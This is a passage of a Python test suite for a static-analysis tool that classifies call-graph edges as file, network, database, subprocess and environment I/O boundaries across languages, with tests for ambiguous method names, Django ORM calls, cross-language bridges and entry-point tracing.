        edge = self._make_edge(
            src="python:/app/main.py:4-6:main:function",
            dst="python:subprocess:0-0:run:external_symbol",
        )
        assert tag_io_boundaries([edge], {"python": catalog}) == 1
        assert edge.meta is not None
        assert edge.meta["io_boundary"] == "subprocess"

    def test_a_constructor_that_is_not_a_primitive_is_still_not_tagged(
        self,
    ) -> None:
        """NON-VACUITY / precision guard on the widening above.

        Admitting ``instantiates`` must not turn every construction into a
        boundary. ``pathlib.Path`` is the case to watch: the catalogue carries
        19 rows under it and every one is ``kind: method``, so building a
        ``Path`` — which performs no I/O — matches nothing, while
        ``Path(p).write_text(x)`` is tagged on the method edge as before. If
        this test ever fails, a ``Path``-shaped row was added at function kind
        and every path construction in the corpus just became fs I/O.
        """
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/main.py:4-6:main:function",
            dst="python:pathlib:0-0:Path:external_symbol",
            edge_type="instantiates",
        )
        assert tag_io_boundaries([edge], {"python": catalog}) == 0
        assert edge.meta is None

    def test_skips_unknown_language(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="cobol:/app/main.cbl:1:MAIN:paragraph",
            dst="cobol:/stdlib/io.cbl:1:OPEN-FILE:paragraph",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0

    def test_unresolved_replace_call_is_not_tagged(self) -> None:
        # INV-maluk: pathlib.Path.replace is a method primitive whose short
        # name collides with str/bytes/list/dict.replace. The Python analyzer
        # emits "python:external:0-0:replace:unresolved" for any unresolved
        # `something.replace(...)` call (40+ such edges in hypergumbo's own
        # 2026-04-23 self-analysis came from string normalization in
        # linkers, e.g. linkers/dependency.py:49 'name.replace("-", "_")').
        # `replace` must be in python.yaml#ambiguous_names so the matcher
        # refuses to fall back to the short-name match when there's no
        # discriminating module context — same discipline that `read`,
        # `write`, `close`, `get`, `post`, etc. already get.
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/some/file.py:10-12:caller:function",
            dst="python:external:0-0:replace:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0, (
            "Unresolved bare `replace` call must NOT be tagged as a Path.replace "
            "filesystem rename. Add 'replace' to python.yaml#ambiguous_names."
        )
        assert edge.meta is None

    def test_resolved_path_replace_still_tagged_with_module_hint(self) -> None:
        # Counterpart to test_unresolved_replace_call_is_not_tagged: when the
        # analyzer DOES resolve the receiver (so the dst carries a
        # pathlib.Path module hint), the matcher must still tag it as
        # fs_write. Adding an entry to ambiguous_names suppresses ONLY the
        # unfiltered short-name fallback — the module-context branch still
        # fires.
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/some/file.py:10-12:caller:function",
            dst="python:pathlib.Path:0-0:replace:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta is not None
        assert edge.meta["io_boundary"] == "fs_write"
        assert edge.meta["io_primitive"] == "pathlib.Path.replace"

    def test_tags_subprocess_call(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/deploy.py:50-52:deploy:function",
            dst="python:/stdlib/subprocess.py:200-210:subprocess.run:function",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "subprocess"

    def test_tags_sqlite3_connect_as_db_read(self) -> None:
        # WI-harin: sqlite3.connect is the reliably-matchable stdlib db
        # anchor. `connect` is ambiguous (socket.socket.connect is net_send),
        # so the module hint ``sqlite3`` disambiguates it to db_read.
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/store.py:10-12:open_db:function",
            dst="python:sqlite3:0-0:connect:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "db_read"
        assert edge.meta["io_primitive"] == "sqlite3.connect"

    def test_tags_dbm_open_as_db_read(self) -> None:
        # WI-harin: dbm.open / shelve.open are stdlib key-value datastore
        # opens. `open` is ambiguous (builtins.open is fs_read), so the
        # ``dbm`` module hint disambiguates to db_read.
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/cache.py:5-7:load:function",
            dst="python:dbm:0-0:open:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "db_read"
        assert edge.meta["io_primitive"] == "dbm.open"

    def test_unresolved_bare_db_method_not_tagged(self) -> None:
        # WI-harin feasibility guard: Django-ORM-style calls arrive as bare
        # untyped unresolved method calls (`.execute()` / `.save()` on a
        # receiver hypergumbo cannot type). The DB-API method entries
        # (sqlite3.Cursor.execute, ...) must NOT match such an edge — doing
        # so by short name would false-positive on every `.execute()` /
        # `.save()` in the corpus. This is the same INV-tapat/INV-maluk
        # discipline that keeps bare `.replace()` from matching Path.replace,
        # and it is precisely why Django ORM visibility needs receiver
        # inference rather than catalog entries.
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/models.py:20-30:save_row:function",
            dst="python:external:0-0:execute:unresolved",
        )
        edge.meta = {"call_construct": "method"}
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0
        assert edge.meta.get("io_boundary") is None

    def test_multiple_edges_mixed(self) -> None:
        catalog = load_catalog("python")
        edges = [
            self._make_edge(
                src="python:/a.py:1:f:function",
                dst="python:/os.py:1:os.listdir:function",
            ),
            self._make_edge(
                src="python:/a.py:2:f:function",
                dst="python:/math.py:1:math.sqrt:function",
            ),
            self._make_edge(
                src="python:/a.py:3:f:function",
                dst="python:/sub.py:1:subprocess.run:function",
            ),
        ]
        count = tag_io_boundaries(edges, {"python": catalog})
        assert count == 2  # listdir + subprocess.run
        assert edges[0].meta is not None
        assert edges[1].meta is None
        assert edges[2].meta is not None

    def test_preserves_existing_meta(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/a.py:1:f:function",
            dst="python:/os.py:1:os.listdir:function",
        )
        edge.meta = {"existing_key": "value"}
        tag_io_boundaries([edge], {"python": catalog})
        assert edge.meta["existing_key"] == "value"
        assert edge.meta["io_boundary"] == "fs_read"

    def test_empty_dst_parts(self) -> None:
        """Edge with empty dst is skipped gracefully."""
        catalog = load_catalog("python")
        edge = self._make_edge(src="python:a", dst="", edge_type="calls")
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0

    def test_tags_module_attr_ref_to_attribute_primitive(self) -> None:
        """WI-guhok: attribute-style primitives (os.environ) are matched from
        module_attr_ref edges.  Without this, the ``attributes:`` entries in
        io_primitives YAML catalogs were dead metadata — the loader parsed
        them but tag_io_boundaries never saw any edge that would reach them.
        """
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/cfg.py:10-12:reader:function",
            dst="python:os:0-0:os.environ:attribute",
            edge_type="module_attr_ref",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta is not None
        assert edge.meta["io_boundary"] == "env_read"
        assert edge.meta["io_primitive"] == "os.environ"

    def test_tags_module_attr_ref_to_sys_argv(self) -> None:
        """WI-guhok: sys.argv attribute primitive is matched via module_attr_ref."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/cli.py:5-6:parse:function",
            dst="python:sys:0-0:sys.argv:attribute",
            edge_type="module_attr_ref",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "env_read"
        assert edge.meta["io_primitive"] == "sys.argv"

    def test_module_attr_ref_on_non_attribute_primitive_no_false_tag(self) -> None:
        """A module_attr_ref edge to a name that isn't in the catalog is skipped.

        Guards against false positives where adding module_attr_ref to the
        tagging pipeline could inadvertently match arbitrary attribute reads.
        """
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/a.py:1-2:f:function",
            dst="python:myapp:0-0:myapp.settings:attribute",
            edge_type="module_attr_ref",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0
        assert edge.meta is None

    def test_ffi_edge_types_traced(self) -> None:
        """FFI edge types (wasm_bridge, ipc_calls, etc.) are included in boundary tagging."""
        catalog = load_catalog("python")
        # A wasm_bridge edge where the target is a Python I/O function
        edge = self._make_edge(
            src="typescript:/app/wasm.ts:1:loadWasm:function",
            dst="python:/stdlib/os.py:1:os.listdir:function",
            edge_type="wasm_bridge",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "fs_read"

    def test_cgo_bridge_edge_traced(self) -> None:
        """cgo_bridge edges are included in boundary tagging."""
        catalog = load_catalog("c")
        edge = self._make_edge(
            src="go:/app/main.go:1:OpenDB:function",
            dst="c:external:0-0:fopen:unresolved",
            edge_type="cgo_bridge",
        )
        count = tag_io_boundaries([edge], {"c": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "fs_read"

    def test_ffi_bridge_edge_traced(self) -> None:
        """ffi_bridge edges are included in boundary tagging."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="rust:/lib.rs:1:read_file:function",
            dst="python:/stdlib/os.py:1:os.listdir:function",
            edge_type="ffi_bridge",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "fs_read"

    def test_ipc_calls_edge_traced(self) -> None:
        """ipc_calls edges are traced for I/O boundary tagging."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="rust:/app/main.rs:1:invoke:function",
            dst="python:/handler.py:1:subprocess.run:function",
            edge_type="ipc_calls",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "subprocess"

    def test_cgo_stdlib_call_uses_c_catalog(self) -> None:
        """Go cgo calls to C stdlib (go:C:0-0:fopen) use the C catalog.

        When Go code calls C.fopen() via cgo, the Go analyzer emits a
        plain 'calls' edge to go:C:0-0:fopen:unresolved. The cgo linker
        does NOT create a cgo_bridge edge because fopen is in libc, not
        a repo-local C function. The IO boundary tagger must recognize
        the go:C: pseudo-namespace and redirect to the C catalog.
        """
        c_catalog = load_catalog("c")
        go_catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/app/file.go:57-59:OpenFile:function",
            dst="go:C:0-0:fopen:unresolved",
            edge_type="calls",
        )
        count = tag_io_boundaries(
            [edge], {"go": go_catalog, "c": c_catalog}
        )
        assert count == 1
        assert edge.meta["io_boundary"] == "fs_read"
        assert "fopen" in edge.meta["io_primitive"]

    def test_cgo_stdlib_fwrite_uses_c_catalog(self) -> None:
        """Go cgo C.fwrite() is tagged as fs_write via C catalog."""
        c_catalog = load_catalog("c")
        go_catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/app/file.go:89-99:File.Write:method",
            dst="go:C:0-0:fwrite:unresolved",
            edge_type="calls",
        )
        count = tag_io_boundaries(
            [edge], {"go": go_catalog, "c": c_catalog}
        )
        assert count == 1
        assert edge.meta["io_boundary"] == "fs_write"

    def test_cgo_stdlib_socket_uses_c_catalog(self) -> None:
        """Go cgo C.socket() is tagged as net_send via C catalog."""
        c_catalog = load_catalog("c")
        go_catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/app/net.go:10-20:Connect:function",
            dst="go:C:0-0:socket:unresolved",
            edge_type="calls",
        )
        count = tag_io_boundaries(
            [edge], {"go": go_catalog, "c": c_catalog}
        )
        assert count == 1
        assert edge.meta is not None
        assert "net" in edge.meta["io_boundary"]

    def test_cgo_non_io_function_not_tagged(self) -> None:
        """Go cgo C.strlen() is NOT tagged (not an IO primitive)."""
        c_catalog = load_catalog("c")
        go_catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/app/util.go:5:Len:function",
            dst="go:C:0-0:strlen:unresolved",
            edge_type="calls",
        )
        count = tag_io_boundaries(
            [edge], {"go": go_catalog, "c": c_catalog}
        )
        assert count == 0
        assert edge.meta is None


class TestKindAwareNoModuleGate:
    """io-boundary:F3 — the no-module-context fallback is kind-aware
    (INV-tapat / INV-maluk).

    With no usable module hint and no receiver evidence:

    * a method-kind primitive needs a receiver/module it does not have here,
      so it never matches (closing INV-tapat: no receiver verification, and
      INV-maluk: ``str.replace`` matching ``pathlib.Path.replace``);
    * a free-function call may still match a function-kind primitive;
    * an explicit ``call_construct="method"`` is rejected outright (an untyped
      method call, even one whose short name happens to be a function-kind
      primitive, has an unknown receiver).
    """

    # --- the unit triad ---

    def test_function_bare_matches(self) -> None:
        """A bare free-function call matches a function-kind primitive."""
        catalog = load_catalog("python")
        hit = catalog.lookup_with_module("listdir", None)
        assert hit is not None
        assert hit.kind == "function"
        assert hit.qualified_name == "os.listdir"

    def test_method_bare_suppressed(self) -> None:
        """A bare method-kind primitive is suppressed with no module context.

        ``write_text`` is ``pathlib.Path.write_text`` (method-kind only); with
        no receiver evidence it must not match. (``read_text`` is unsuitable
        here — it ALSO has a function-kind ``importlib.resources.read_text``
        entry, which a bare free-function call legitimately matches.)
        """
        catalog = load_catalog("python")
        assert catalog.lookup_with_module("write_text", None) is None

    def test_method_construct_suppressed(self) -> None:
        """An explicit method call construct is rejected outright.

        ``replace`` collides with ``str.replace`` / ``pathlib.Path.replace``;
        an untyped ``x.replace(...)`` (call_construct="method") must not match.
        """
        catalog = load_catalog("python")
        assert catalog.lookup_with_module(
            "replace", None, call_construct="method") is None

    def test_method_with_module_matches(self) -> None:
        """With a receiver module the method-kind primitive matches (the
        module-filter branch runs before the gate)."""
        catalog = load_catalog("python")
        hit = catalog.lookup_with_module("read_text", "pathlib")
        assert hit is not None
        assert hit.qualified_name == "pathlib.Path.read_text"

    def test_replace_with_module_matches(self) -> None:
        """``replace`` with a pathlib module hint resolves to Path.replace."""
        catalog = load_catalog("python")
        hit = catalog.lookup_with_module("replace", "pathlib.Path")
        assert hit is not None
        assert hit.qualified_name == "pathlib.Path.replace"

    def test_function_construct_with_method_kind_hit_suppressed(self) -> None:
        """call_construct="function" still cannot promote a method-kind hit:
        ``write_text`` has only a method-kind entry, so it stays suppressed."""
        catalog = load_catalog("python")
        assert catalog.lookup_with_module(
            "write_text", None, call_construct="function") is None

    # --- cross-language invariant ---

    def test_no_method_kind_matches_bare_method_call(self) -> None:
        """Cross-language invariant: for EVERY catalog, no method-kind
        primitive is returned by a bare call carrying call_construct="method".

        This is the load-bearing INV-tapat/INV-maluk property — it must hold
        for all 14 language catalogs, not just python (an invariant, not a
        golden snapshot).
        """
        from pathlib import Path as _Path

        from hypergumbo_core import io_boundary as _iob

        catalog_dir = _Path(_iob.__file__).parent / "io_primitives"
        languages = sorted(p.stem for p in catalog_dir.glob("*.yaml"))
        assert languages, "no io_primitives catalogs found"
        offenders: list[str] = []
        for lang in languages:
            catalog = load_catalog(lang)
            for prim in catalog.primitives:
                if prim.kind != "method":
                    continue
                got = catalog.lookup_with_module(
                    prim.name, None, call_construct="method")
                if got is not None:
                    offenders.append(
                        f"{lang}: {prim.qualified_name} (matched {got.qualified_name})")
        assert not offenders, (
            "method-kind primitives must not match a bare method call with no "
            "module context (INV-tapat/INV-maluk):\n" + "\n".join(offenders))

    def test_no_method_kind_matches_bare_no_construct(self) -> None:
        """Companion invariant: even with NO call_construct (analyzers like
        scala/swift/kotlin that emit unresolved edges without a construct), a
        bare method-kind primitive with no module context is suppressed — the
        ``non_method`` filter, not just the explicit-method early return."""
        from pathlib import Path as _Path

        from hypergumbo_core import io_boundary as _iob

        catalog_dir = _Path(_iob.__file__).parent / "io_primitives"
        languages = sorted(p.stem for p in catalog_dir.glob("*.yaml"))
        for lang in languages:
            catalog = load_catalog(lang)
            for prim in catalog.primitives:
                if prim.kind != "method":
                    continue
                # A name shared with a function-kind primitive may still match
                # (the function variant); only assert no method-kind result.
                got = catalog.lookup_with_module(prim.name, None)
                assert got is None or got.kind != "method", (
                    f"{lang}: bare method-kind {prim.qualified_name} matched "
                    f"{got.qualified_name} with no module context")


class TestModuleQualifiedMatching:
    """Tests for module-qualified IO boundary matching.

    Prevents false positives from generic method names like Read/Write
    by checking the module context in the edge's destination ID.
    """

    def _make_edge(self, src: str, dst: str, edge_type: str = "calls"):
        from dataclasses import dataclass
        from typing import Optional, Dict, Any

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, edge_type=edge_type, meta=None)

    def test_matching_module_tags_edge(self) -> None:
        """Edge with matching module_hint gets tagged."""
        catalog = load_catalog("go")
        # net.Conn.Read is in the catalog — module_hint matches
        edge = self._make_edge(
            src="go:/a.go:1:handler:function",
            dst="go:net.Conn:0-0:Read:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "net_recv"

    def test_mismatched_module_not_tagged(self) -> None:
        """Edge with non-matching module_hint is NOT tagged.

        crypto/rand.Reader.Read() should not match net.Conn.Read because
        crypto/rand != net.Conn.
        """
        catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/a.go:1:encrypt:function",
            dst="go:crypto/rand:0-0:Read:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 0
        assert edge.meta is None

    def test_external_module_hint_falls_back_to_name_match(self) -> None:
        """When module_hint is 'external' (unknown), fall back to name matching."""
        catalog = load_catalog("go")
        # os.Open is in the Go catalog — module_hint "external" means we
        # don't know the module so allow name-only matching
        edge = self._make_edge(
            src="go:/a.go:1:main:function",
            dst="go:external:0-0:Open:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "fs_read"

    def test_python_qualified_name_still_works(self) -> None:
        """Python edges with qualified callee names still match."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/a.py:1:f:function",
            dst="python:/os.py:1:os.listdir:function",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "fs_read"

    def test_rust_write_not_confused_with_net(self) -> None:
        """Rust io::Write.write() shouldn't match net.Conn.Write."""
        catalog = load_catalog("rust")
        # io::Write is a file-like trait, not network
        edge = self._make_edge(
            src="rust:/a.rs:1:save:function",
            dst="rust:std::io::Write:0-0:write:unresolved",
        )
        count = tag_io_boundaries([edge], {"rust": catalog})
        # Should match fs_write (io::Write), not net_send
        if count > 0:
            assert edge.meta["io_boundary"] == "fs_write"


class TestDjangoOrmIoBoundary:
    """WI-sozoj: Django ORM db_read/db_write via the type-verified module path.

    py.py types the ORM receiver (the ``.objects`` Manager marker /
    ``models.Model``-subclass ``self``) and emits a ``django.db.models``
    module-qualified dst. These tests pin that the python.yaml carve-out
    classifies each method through the module-filter path — never the
    short-name gate, so no ``dict.get()``/``.save()`` false positive.
    """

    def _make_edge(self, src: str, dst: str, edge_type: str = "calls"):
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, edge_type=edge_type, meta=None)

    def test_catalog_classifies_manager_read_methods(self) -> None:
        catalog = load_catalog("python")
        for method in ("filter", "get", "all", "count", "exists"):
            hit = catalog.lookup_with_module(method, "django.db.models")
            assert hit is not None, method
            assert hit.boundary == "db_read", method

    def test_catalog_classifies_write_methods(self) -> None:
        catalog = load_catalog("python")
        for method in ("create", "bulk_create", "update", "delete", "save"):
            hit = catalog.lookup_with_module(method, "django.db.models")
            assert hit is not None, method
            assert hit.boundary == "db_write", method

    def test_ambiguous_get_stays_suppressed_without_module(self) -> None:
        """Regression: the django ``get``/``delete`` entries must NOT leak into
        the short-name (no-module) path — a bare ``.get()`` on an untyped
        receiver stays refused (INV-tapat/INV-maluk), or dict.get() false-tags."""
        catalog = load_catalog("python")
        assert catalog.lookup_with_module("get", "external") is None
        assert catalog.lookup_with_module("delete", "external") is None

    def test_tags_manager_filter_as_db_read(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/views.py:10-12:view:function",
            dst="python:django.db.models:0-0:filter:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "db_read"
        assert edge.meta["io_primitive"] == "django.db.models.filter"

    def test_tags_manager_create_as_db_write(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/views.py:10-12:make:function",
            dst="python:django.db.models:0-0:create:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "db_write"

    def test_tags_instance_save_as_db_write(self) -> None:
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/models.py:10-12:Order.stamp:method",
            dst="python:django.db.models:0-0:save:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_boundary"] == "db_write"

    def test_bare_untyped_get_not_tagged_as_django(self) -> None:
        """A bare ``.get()`` with no django module hint (untyped receiver) is
        NOT tagged — the carve-out only fires through the typed module path."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/app/cache.py:1-3:load:function",
            dst="python:external:0-0:get:unresolved",
        )
        edge.meta = {"call_construct": "method"}
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0
        assert edge.meta.get("io_boundary") is None


class TestComputeBoundaryMap:
    """Tests for the full boundary map computation."""

    def _make_edge(self, src: str, dst: str, edge_type: str = "calls"):
        from dataclasses import dataclass
        from typing import Optional, Dict, Any

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, edge_type=edge_type, meta=None)

    def test_basic_boundary_map(self) -> None:
        catalog = load_catalog("python")
        edges = [
            self._make_edge(
                src="python:/app/main.py:10:main:function",
                dst="python:/os.py:1:os.listdir:function",
            ),
            self._make_edge(
                src="python:/app/main.py:20:main:function",
                dst="python:/sub.py:1:subprocess.run:function",
            ),
            self._make_edge(
                src="python:/app/main.py:30:main:function",
                dst="python:/math.py:1:math.sqrt:function",
            ),
        ]
        bmap = compute_boundary_map(edges, {"python": catalog})
        assert bmap.total_io_edges == 2
        assert "fs_read" in bmap.entries
        assert "subprocess" in bmap.entries
        assert len(bmap.entries["fs_read"].chains) == 1
        assert bmap.entries["fs_read"].primitives_used == ["os.listdir"]

    def test_boundary_map_to_dict(self) -> None:
        catalog = load_catalog("python")
        edges = [
            self._make_edge(
                src="python:/a.py:1:f:function",
                dst="python:/os.py:1:os.listdir:function",
            ),
        ]
        bmap = compute_boundary_map(edges, {"python": catalog})
        d = bmap.to_dict()
        assert d["total_io_edges"] == 1
        assert "fs_read" in d["boundaries"]
        assert d["boundaries"]["fs_read"]["chain_count"] == 1

    def _prestamped_edge(self, src: str, dst: str, io_boundary: str, primitive: str):
        """A producer-prestamped edge (meta.io_boundary already set), mirroring
        bash's command_launch emission that never touches a data-I/O catalog."""
        from dataclasses import dataclass
        from typing import Optional, Dict, Any

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None
            is_resolved: bool = False

        return MockEdge(
            src=src,
            dst=dst,
            edge_type="calls",
            meta={"io_boundary": io_boundary, "io_primitive": primitive},
        )

    def test_command_launch_disclosed_but_excluded_from_total(self) -> None:
        """WI-javoh: command_launch is aggregated + disclosed in its own cohort
        (command_launch_edges) but EXCLUDED from the total_io_edges headline,
        mirroring the external_potential count-vs-disclose doctrine."""
        catalog = load_catalog("python")
        edges = [
            # one verified catalog subprocess crossing -> counts toward total
            self._make_edge(
                src="python:/a.py:1:f:function",
                dst="python:/sub.py:1:subprocess.run:function",
            ),
            # two bash program launches, prestamped, deduped upstream
            self._prestamped_edge(
                "bash:/s.sh:1:deploy:function",
                "bash:curl:0-0:curl:unresolved",
                "command_launch",
                "curl",
            ),
            self._prestamped_edge(
                "bash:/s.sh:1:deploy:function",
                "bash:git:0-0:git:unresolved",
                "command_launch",
                "git",
            ),
        ]
        bmap = compute_boundary_map(edges, {"python": catalog})
        assert "command_launch" in bmap.entries
        assert len(bmap.entries["command_launch"].chains) == 2
        assert bmap.command_launch_edges == 2
        # headline counts only the verified subprocess, not the 2 launches
        assert bmap.total_io_edges == 1
        d = bmap.to_dict()
        assert d["command_launch_edges"] == 2
        assert d["total_io_edges"] == 1
        assert "command_launch" in d["boundaries"]

    def test_empty_edges(self) -> None:
        bmap = compute_boundary_map([], {"python": load_catalog("python")})
        assert bmap.total_io_edges == 0
        assert len(bmap.entries) == 0

    def test_io_chain_dataclass(self) -> None:
        chain = IoChain(
            boundary="fs_read",
            primitive="os.listdir",
            io_edge_src="python:/a.py:1:f:function",
            io_edge_dst="python:/os.py:1:os.listdir:function",
            entry_points=["main"],
        )
        assert chain.boundary == "fs_read"
        assert chain.entry_points == ["main"]

    def test_edges_with_non_io_meta_skipped(self) -> None:
        """Edges with meta but no io_boundary are not counted."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:/a.py:1:f:function",
            dst="python:/b.py:1:g:function",
        )
        edge.meta = {"access_mode": "read"}  # non-IO meta
        bmap = compute_boundary_map([edge], {"python": catalog})
        assert bmap.total_io_edges == 0
        assert len(bmap.entries) == 0

    def test_chains_with_entry_points(self) -> None:
        """IoChain entry_points are aggregated into BoundaryMapEntry."""
        from hypergumbo_core.io_boundary import BoundaryMapEntry
        chain = IoChain(
            boundary="fs_read",
            primitive="os.listdir",
            io_edge_src="python:/a.py:1:f:function",
            io_edge_dst="python:/os.py:1:os.listdir:function",
            entry_points=["main", "cli_handler"],
        )
        entry = BoundaryMapEntry(boundary="fs_read")
        entry.chains.append(chain)
        ep_set: set[str] = set()
        for c in entry.chains:
            for ep in c.entry_points:
                ep_set.add(ep)
        entry.entry_points = sorted(ep_set)
        assert entry.entry_points == ["cli_handler", "main"]

    def test_multiple_primitives_same_boundary(self) -> None:
        catalog = load_catalog("python")
        edges = [
            self._make_edge(
                src="python:/a.py:1:f:function",
                dst="python:/os.py:1:os.listdir:function",
            ),
            self._make_edge(
                src="python:/b.py:1:g:function",
                dst="python:/os.py:2:os.walk:function",
            ),
        ]
        bmap = compute_boundary_map(edges, {"python": catalog})
        assert bmap.total_io_edges == 2
        assert len(bmap.entries["fs_read"].chains) == 2
        assert sorted(bmap.entries["fs_read"].primitives_used) == [
            "os.listdir", "os.walk",
        ]


class TestEntryPointTracing:
    """Tests for reverse-tracing IO edges back to entrypoints."""

    def _make_edge(self, src: str, dst: str, edge_type: str = "calls"):
        from dataclasses import dataclass
        from typing import Optional, Dict, Any

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, edge_type=edge_type, meta=None)

    def test_entry_points_populated_when_provided(self) -> None:
        """When entrypoints are provided, IO chains have entry_points populated."""
        catalog = load_catalog("python")
        edges = [
            # main → helper → os.listdir (IO)
            self._make_edge(src="main", dst="helper"),
            self._make_edge(src="helper", dst="python:os:0-0:listdir:function"),
        ]
        entrypoint_ids = {"main"}

        bmap = compute_boundary_map(edges, {"python": catalog}, entrypoint_ids=entrypoint_ids)
        assert bmap.total_io_edges >= 1
        fs_entry = bmap.entries.get("fs_read")
        assert fs_entry is not None
        assert "main" in fs_entry.entry_points

    def test_entry_points_empty_without_entrypoints(self) -> None:
        """When no entrypoints provided, entry_points remain empty."""
        catalog = load_catalog("python")
        edges = [
            self._make_edge(src="helper", dst="python:os:0-0:listdir:function"),
        ]

        bmap = compute_boundary_map(edges, {"python": catalog})
        fs_entry = bmap.entries.get("fs_read")
        assert fs_entry is not None
        assert len(fs_entry.entry_points) == 0

    def test_multiple_entry_points_reach_same_io(self) -> None:
        """Multiple entrypoints can reach the same IO chain."""
        catalog = load_catalog("python")
        edges = [
            self._make_edge(src="main1", dst="helper"),
            self._make_edge(src="main2", dst="helper"),
            self._make_edge(src="helper", dst="python:os:0-0:listdir:function"),
        ]
        entrypoint_ids = {"main1", "main2"}

        bmap = compute_boundary_map(edges, {"python": catalog}, entrypoint_ids=entrypoint_ids)
        fs_entry = bmap.entries["fs_read"]
        assert "main1" in fs_entry.entry_points
        assert "main2" in fs_entry.entry_points

    def test_cyclic_call_graph_terminates(self) -> None:
        """BFS handles cycles in the call graph without infinite loop."""
        catalog = load_catalog("python")
        edges = [
            # main → a → b → a (cycle) → os.listdir
            self._make_edge(src="main", dst="a"),
            self._make_edge(src="a", dst="b"),
            self._make_edge(src="b", dst="a"),  # cycle
            self._make_edge(src="a", dst="python:os:0-0:listdir:function"),
        ]
        entrypoint_ids = {"main"}

        bmap = compute_boundary_map(edges, {"python": catalog}, entrypoint_ids=entrypoint_ids)
        fs_entry = bmap.entries["fs_read"]
        assert "main" in fs_entry.entry_points

    def test_native_bridge_edge_traced_to_entrypoint(self) -> None:
        """Entry-point trace crosses native (JNI) bridge edges (Java→C).

        Post Phase-3 (WI-mifor-vabul): bridges fold to canonical 'calls'
        + meta['bridge_kind']='native'. The reverse-graph traversal
        crosses bridges via the 'calls' membership in
        _TRACEABLE_EDGE_TYPES.
        """
        catalog = load_catalog("c")
        edges = [
            # Java side: main → nativeRead → C_impl → fopen
            self._make_edge(src="java_main", dst="native_method"),
            self._make_edge(src="native_method", dst="c_jni_impl", edge_type="calls"),
            self._make_edge(src="c_jni_impl", dst="c:external:0-0:fopen:unresolved"),
        ]
        entrypoint_ids = {"java_main"}

        bmap = compute_boundary_map(edges, {"c": catalog}, entrypoint_ids=entrypoint_ids)
        assert bmap.total_io_edges >= 1
        fs_entry = bmap.entries.get("fs_read")
        assert fs_entry is not None
        assert "java_main" in fs_entry.entry_points

    def test_cgo_bridge_edge_traced_to_entrypoint(self) -> None:
        """Entry-point trace crosses cgo bridge edges (Go→C).

